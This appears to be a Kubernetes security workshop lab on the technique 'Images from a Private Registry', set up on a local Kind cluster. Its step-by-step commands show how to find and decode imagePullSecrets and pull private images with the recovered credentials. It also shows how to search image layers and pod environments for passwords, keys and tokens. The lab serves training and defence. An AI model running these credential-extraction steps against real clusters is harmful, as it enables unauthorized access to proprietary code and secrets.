# Images from a Private Registry

An attacker who gains access to a Kubernetes cluster can often retrieve `imagePullSecrets` stored as Kubernetes Secrets. Once decoded, those credentials grant direct pull access to the private container registry, allowing the attacker to inspect every image stored there — including proprietary application code and any secrets baked into image layers or environment definitions.

## Description

Container images running in a cluster are frequently stored in private registries such as Azure Container Registry (ACR), Amazon Elastic Container Registry (ECR), or a self-hosted registry. To pull those images, the container runtime needs credentials. In Kubernetes these credentials are stored as `kubernetes.io/dockerconfigjson` Secrets and referenced by pods via `imagePullSecrets`.

If an attacker gains read access to Secrets (directly via `kubectl get secret`, through an overly permissive ServiceAccount, or by exploiting a vulnerable application with access to the API), they can:

1. Decode the `.dockerconfigjson` field to recover registry credentials.
2. Use those credentials with `docker pull` (or `skopeo`) to pull every image in the registry.
3. Inspect image layers to find hardcoded secrets, private source code, or internal API endpoints.

This technique is relevant in all major cloud environments. In EKS the node's IAM role often carries `AmazonEC2ContainerRegistryReadOnly`, and in AKS a managed identity attached to the node pool can authenticate to ACR — meaning the attacker does not even need a Kubernetes Secret.

## Why This Matters

> **Attacker Value:** Private container images are a goldmine for adversaries. Pulling images from a compromised registry gives an attacker:
>
> - **Proprietary source code** — application logic, algorithms, and business rules baked into image layers.
> - **Hardcoded secrets and API keys** — credentials embedded in environment variables, config files, or build arguments that were never meant to leave the build pipeline.
> - **Internal API patterns and endpoints** — service URLs, gRPC definitions, and GraphQL schemas that map the internal architecture.
> - **Dependency information** — exact package versions and internal libraries that enable targeted supply-chain attacks.
>
> Even a single image can expose enough information to pivot deeper into the organization's infrastructure.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- `docker` installed on your local machine (used to pull and inspect images).
- The attacker has obtained `get`/`list` permissions on Secrets in the target namespace (via a misconfigured RBAC role, a stolen ServiceAccount token, or cluster-admin access).

## Quick Start

### Step 1 — Deploy the private registry and seed it with an image

Deploy a password-protected Docker registry inside the cluster and push a tagged image to it.

```bash
kubectl apply -f registry.yaml
```

Wait for the registry pod to become ready:

```bash
kubectl rollout status deployment/private-registry
```

#### Seed the registry with an image

Use `skopeo` inside a pod to copy a public image directly into the in-cluster registry (no local Docker push required):

```bash
REGISTRY_IP=$(kubectl get svc private-registry -o jsonpath='{.spec.clusterIP}')

kubectl run registry-seeder --image=quay.io/skopeo/stable:latest \
  --restart=Never \
  -- copy --insecure-policy \
     --dest-tls-verify=false \
     --src-tls-verify=false \
     docker://nginx:1.25-alpine \
     docker://${REGISTRY_IP}:5000/internal/webapp:latest \
     --dest-creds=reguser:regpassword

kubectl wait --for=condition=complete job/registry-seeder --timeout=120s 2>/dev/null || \
  kubectl wait --for=jsonpath='{.status.phase}'=Succeeded pod/registry-seeder --timeout=120s

kubectl logs registry-seeder
kubectl delete pod registry-seeder
```

Expected output:

```
Copying blob sha256:...
Copying config sha256:...
Writing manifest to image destination
```

#### Configure Kind nodes to pull from the in-cluster registry

The Kind cluster nodes need to know that `private-registry:5000` is an insecure (HTTP) registry
and needs host resolution to the ClusterIP. Run the following setup commands:

```bash
REGISTRY_IP=$(kubectl get svc private-registry -o jsonpath='{.spec.clusterIP}')

# Step A: Map the registry's ClusterIP to a hostname on every Kind node.
# Kind nodes run as Docker containers and don't use cluster DNS, so we
# manually add an /etc/hosts entry so containerd can resolve "private-registry".
for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
  docker exec $node sh -c "echo '${REGISTRY_IP} private-registry' >> /etc/hosts"
done

# Step B: Tell containerd that "private-registry:5000" is an HTTP (not HTTPS)
# registry. Without this, containerd defaults to TLS and the pull will fail
# with a certificate error.
# The hosts.toml file follows the containerd registry host configuration spec:
#   https://github.com/containerd/containerd/blob/main/docs/hosts.md
for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
  docker exec $node sh -c "
    # Create the per-registry config directory (name must match the registry host:port)
    mkdir -p /etc/containerd/certs.d/private-registry:5000

    # Write the host configuration — capabilities list what operations are
    # allowed over this insecure transport; skip_verify disables TLS cert checks.
    cat > /etc/containerd/certs.d/private-registry:5000/hosts.toml << 'EOF'
[host.\"http://private-registry:5000\"]
  capabilities = [\"pull\", \"resolve\", \"push\"]
  skip_verify = true
EOF

    # Point containerd's CRI plugin at the certs.d directory.
    # This line is idempotent — it only appends if 'config_path' is not
    # already present in config.toml. If you see pull errors after this step,
    # verify that config.toml does not have a conflicting [plugins.*.registry]
    # section higher up in the file.
    grep -q 'config_path' /etc/containerd/config.toml || \
      printf '\n[plugins.\"io.containerd.grpc.v1.cri\".registry]\n  config_path = \"/etc/containerd/certs.d\"\n' \
      >> /etc/containerd/config.toml

    # Restart containerd to pick up the new registry configuration.
    # This will briefly make the node NotReady — the sleep below accounts for it.
    systemctl restart containerd
  "
done

# Wait for nodes to recover after containerd restart (kubelet needs ~10-15s
# to re-register once containerd comes back up)
sleep 15
kubectl get nodes
```

> **Note:** These containerd configuration steps are only required when the registry runs as an in-cluster service on a Kind cluster. In a real cloud environment (ECR, ACR, GCR) the container runtime is pre-configured to pull via TLS.

### Step 2 — Deploy the registry Secret and a pod that uses it

Apply the `imagePullSecret` and the target pod:

```bash
kubectl apply -f registry-secret.yaml
kubectl apply -f app-with-secret.yaml
```

At this point the cluster has a Secret named `registry-credentials` that holds base64-encoded docker credentials. The pod `app-from-registry` references this Secret so the container runtime can pull from the private registry.

### Step 3 — Enumerate and extract the imagePullSecret

As an attacker with API access, list all Secrets in the namespace to find registry credentials:

```bash
kubectl get secrets --all-namespaces | grep dockerconfigjson
```

Expected output:

```
default   registry-credentials   kubernetes.io/dockerconfigjson   1      ...
```

Extract the raw `.dockerconfigjson` value:

```bash
kubectl get secret registry-credentials \
  -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
```

Expected output (formatted for readability):

```json
{
  "auths": {
    "private-registry:5000": {
      "username": "reguser",
      "password": "regpassword",
      "auth": "cmVndXNlcjpyZWdwYXNzd29yZA=="
    }
  }
}
```

> The `auth` field encodes `reguser:regpassword` in base64. Verify with: `echo "cmVndXNlcjpyZWdwYXNzd29yZA==" | base64 -d`

The `auth` field is simply `base64(username:password)`. Decode it:

```bash
echo "cmVndXNlcjpyZWdwYXNzd29yZA==" | base64 -d
```

Expected output:

```
reguser:regpassword
```

### Step 4 — Pull images from the registry using the recovered credentials

Use `skopeo` (from inside a pod) or Docker to pull the private image with the recovered credentials.

**Option A — from a pod inside the cluster (no local Docker required):**

```bash
REGISTRY_IP=$(kubectl get svc private-registry -o jsonpath='{.spec.clusterIP}')

kubectl run attacker-pull --image=quay.io/skopeo/stable:latest \
  --restart=Never \
  -- list-tags --insecure-policy --tls-verify=false \
     --creds=reguser:regpassword \
     docker://${REGISTRY_IP}:5000/internal/webapp
kubectl logs attacker-pull
kubectl delete pod attacker-pull
```

**Option B — from your local machine with Docker (requires port-forward and insecure-registry config):**

```bash
kubectl port-forward svc/private-registry 5000:5000 &
PORT_FWD_PID=$!
# Ensure localhost:5000 is added to Docker daemon's insecure-registries list
docker login localhost:5000 -u reguser -p regpassword
docker pull localhost:5000/internal/webapp:latest
kill $PORT_FWD_PID
```

> **Note:** On macOS with Colima, the Docker daemon runs inside a VM and cannot reach `localhost:5000` on the Mac host directly via `kubectl port-forward`. You need to configure the Docker daemon's `insecure-registries` and forward to `0.0.0.0`. Prefer Option A for this lab.

### Step 5 — Inspect image layers for embedded secrets

Inspect the image metadata and environment variables defined in the image:

```bash
docker inspect localhost:5000/internal/webapp:latest \
  --format '{{ json .Config.Env }}' | python3 -m json.tool
```

List every layer in the image to find files added by the build process:

```bash
docker history localhost:5000/internal/webapp:latest --no-trunc
```

Save and extract the image filesystem to inspect all files across all layers:

```bash
docker save localhost:5000/internal/webapp:latest -o webapp.tar
mkdir -p webapp-layers && tar -xf webapp.tar -C webapp-layers

# Search all layer tarballs for common secret patterns
for layer_tar in webapp-layers/*/layer.tar; do
  tar -tf "$layer_tar" 2>/dev/null | grep -iE "(secret|password|key|token|credential|\.env|\.pem|\.p12)"
done
```

Additionally, inspect the running pod's environment variables directly — many teams embed secrets there:

```bash
kubectl exec app-from-registry -c app -- sh -c 'env | grep -iE "(password|key|token|secret)"'
```

Expected output:

```
DB_PASSWORD=super-secret-db-password-123
API_KEY=sk-prod-api-key-do-not-share
```

Stop the port-forward:

```bash
kill $PORT_FWD_PID
```

## Cleanup

```bash
kubectl delete -f app-with-secret.yaml
kubectl delete -f registry-secret.yaml
kubectl delete -f registry.yaml
rm -f webapp.tar
rm -rf webapp-layers
```

If you configured the Kind nodes for the in-cluster registry in Step 1, undo those changes:

```bash
# Remove private-registry hosts entry and containerd config from each node
# Note: sed -i does not work on Kind node /etc/hosts (overlayfs); use python3 instead.
for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
  docker exec $node python3 -c "
import re
with open('/etc/hosts','r') as f: content = f.read()
content = re.sub(r'.*private-registry.*\n', '', content)
with open('/etc/hosts.new','w') as f: f.write(content)
import os; os.replace('/etc/hosts.new', '/etc/hosts')
"
  docker exec $node rm -rf /etc/containerd/certs.d/private-registry:5000
  docker exec $node systemctl restart containerd
done
```

## Resources

- [kubectl get secret](https://kubernetes.io/docs/concepts/configuration/secret/)
- [Pull an Image from a Private Registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [Azure Container Registry](https://azure.microsoft.com/en-us/services/container-registry/)
- [Amazon Elastic Container Registry](https://aws.amazon.com/ecr/)
- [skopeo — inspect remote images without pulling](https://github.com/containers/skopeo)
- [MITRE ATT&CK for Containers — Images from a Private Registry](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Images%20from%20a%20private%20registry/)
